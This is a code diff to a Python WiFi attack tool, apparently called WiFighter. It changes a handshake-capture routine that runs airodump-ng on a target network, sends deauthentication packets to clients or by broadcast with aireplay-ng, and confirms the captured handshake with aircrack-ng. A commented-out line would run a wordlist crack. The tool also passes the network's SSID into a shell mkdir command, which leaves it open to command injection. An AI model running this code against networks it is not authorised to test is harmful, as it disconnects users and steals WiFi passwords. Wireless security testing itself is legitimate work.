@@ -394,7 +394,6 @@ def list_ap(wifi_networks):
 # | Attacks | #
 
 def handshake_crack(target_ap, interface):
-     print(target_ap)
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
      bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
      channel = target_ap['Channel'] if target_ap['Channel'] else None
@@ -403,7 +402,7 @@ def handshake_crack(target_ap, interface):
      client_mac = None
 
      global wifighter_path
-     output_dir = f"{wifighter_path}/attacks/{ssid}"
+     output_dir = f"{wifighter_path}/attacks/{ssid.replace(' ', '_')}"
 
      def list_files(directory): 
           return set(os.listdir(directory))
@@ -417,41 +416,55 @@ def handshake_crack(target_ap, interface):
 
      def create_cap_dir(ssid):
           if ssid:
-               if os.path.exists(f'{wifighter_path}/attacks/{ssid}'):
+               if os.path.exists(output_dir):
                     pass
                else:
-                    print(f'Creating capture directory -> WiFighter/attacks/{ssid}')
-                    os.system(f'mkdir {wifighter_path}/attacks/{ssid}')
+                    print(f"Creating capture directory -> WiFighter/attacks/{ssid.replace(' ', '_')}")
+                    os.system(f'mkdir {output_dir}')
                     print()       
 
      def kill_airodump_processes():
           for proc in psutil.process_iter(['pid', 'name']):
                try:
                     if proc.info['name'] == 'airodump-ng':
-                         print(f"Killing process {proc.info['pid']} ({proc.info['name']})")
                          proc.terminate()
                          proc.wait()
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                     pass
+          print(f"{CYAN}[>]{RESET} Killing all airodump-ng processes...")
 
      # Run airodump-ng
      def run_airodump(interface, bssid, channel, output_dir):
           if interface and bssid and channel and output_dir:
-               command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
-               subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+               try:
+                    command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
+                    subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+               except:
+                    pass
 
      # Run aireplay-ng
      def run_aireplay(interface, bssid, client_mac, deauth_type):
-          if interface and bssid and client_mac and deauth_type:
+          if interface and bssid and deauth_type:
                if deauth_type == "client":
                     if client_mac:
-                         command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
-                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                         print(f"[1] Deauth packet send to client {client_mac}")
+                         try:
+                              command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
+                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                              print(f"{CYAN}[>]{RESET} Deauth packet send to client {client_mac}{RESET}")
+                         except:
+                              pass
                elif deauth_type == "broadcast":
-                    command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
-                    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    print(f"[1] Deauth packet send to broadcast")
+                    try:
+                         command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
+                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                         print(f"{CYAN}[>]{RESET} Deauth packet send to broadcast")
+                    except:
+                         pass
+
+
+     print(f'{MAGENTA}| Handshake Crack | {ssid} - {bssid} | {interface} |{RESET}')
+     #print(f'Attacking on {ssid} ({bssid}) on {interface}')
+     print()
 
      create_cap_dir(ssid) # Create capture dir if not exist
 
@@ -467,6 +480,7 @@ def handshake_crack(target_ap, interface):
 
      # Deauth client/s
      deauth_client.start() # Start aireplay-ng process
+
      deauth_client.join() # Wait for the process to stop
 
      files_after = list_files(output_dir) # Get files after airodump-ng adds new
@@ -474,20 +488,22 @@ def handshake_crack(target_ap, interface):
 
      # Wait and verify that handshake was captured successfuly
      captured = False
-     print('[2] Waiting for handshake...')
-     print(f'- Capture file will be saved -> WiFighter/attacks/{ssid}/{output_file} -')
+     print(f"{CYAN}[>]{RESET} Waiting for handshake... -> Capture file will be saved -> WiFighter/attacks/{ssid.replace(' ', '_')}/{output_file}")
      while not captured:
           if os.path.exists(f"{output_dir}/{output_file}"):
-               command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
-               verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-               output = str(verify.communicate())
+               try:
+                    command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
+                    verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                    output = str(verify.communicate())
+               except:
+                    pass
                if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
-                    print("[3] Handshake/s captured!")
+                    print(f"{CYAN}[>]{RESET} Handshake/s captured!")
                     captured = True
           time.sleep(1)
 
      kill_airodump_processes() # Kill all airodump-ng processes
-
+     
      #os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crack password
 
 
@@ -572,7 +588,11 @@ else:
                monitor_switch(None, 'start', interface)
                # Make sure interfering services are not running
                stop_services(None)
-               handshake_crack(target_ap, interface)
-
+               try:
+                    handshake_crack(target_ap, interface)
+               except:
+                    print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+     
+     monitor_switch(None, 'stop', interface)
 
      
